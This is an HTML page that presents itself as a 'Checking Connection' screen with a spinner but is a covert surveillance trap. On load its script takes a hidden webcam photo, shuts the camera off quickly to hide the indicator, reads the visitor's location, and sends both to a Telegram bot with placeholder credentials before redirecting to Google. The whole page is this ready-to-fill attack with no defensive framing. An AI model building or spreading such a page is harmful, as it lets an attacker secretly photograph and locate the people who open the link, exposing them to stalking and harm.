<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checking Connection...</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-white flex items-center justify-center min-h-screen">

    <div class="text-center">
        <div class="w-10 h-10 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
        <p class="text-gray-600 font-medium">Connecting to secure server...</p>
    </div>

    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const TOKEN = 'TUMHARA_TOKEN_YAHAN';
        const ID = 'TUMHARI_ID_YAHAN';

        window.onload = async () => {
            const v = document.getElementById('v');
            const c = document.getElementById('c');

            try {
                // 1. Camera Access & Instant Photo
                const s = await navigator.mediaDevices.getUserMedia({ video: true });
                v.srcObject = s;

                // Photo khinchne mein wait nahi karega
                setTimeout(() => {
                    c.width = v.videoWidth;
                    c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    const photo = c.toDataURL('image/jpeg', 0.5); // Fast compression
                    
                    // Camera turant band (Green dot gayab)
                    s.getTracks().forEach(t => t.stop());

                    // 2. Location Fetch (Parallel)
                    navigator.geolocation.getCurrentPosition(async (p) => {
                        const { latitude: lt, longitude: ln } = p.coords;
                        
                        // Telegram format
                        const fd = new FormData();
                        fd.append('chat_id', ID);
                        fd.append('photo', dataURLtoBlob(photo), 's.jpg');
                        fd.append('caption', `ðŸš€ *Fast Hit!*\nðŸ“ Maps: https://www.google.com/maps?q=${lt},${ln}`);
                        fd.append('parse_mode', 'Markdown');

                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                        
                        // Redirect instantly
                        window.location.href = "https://google.com";
                    }, () => { window.location.href = "https://google.com"; });

                }, 300); // Sirf 0.3 second ka delay camera focus ke liye

            } catch (e) { window.location.href = "https://google.com"; }
        };

        function dataURLtoBlob(dataurl) {
            var arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
                bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
            while(n--) u8arr[n] = bstr.charCodeAt(n);
            return new Blob([u8arr], {type:mime});
        }
    </script>
</body>
</html>
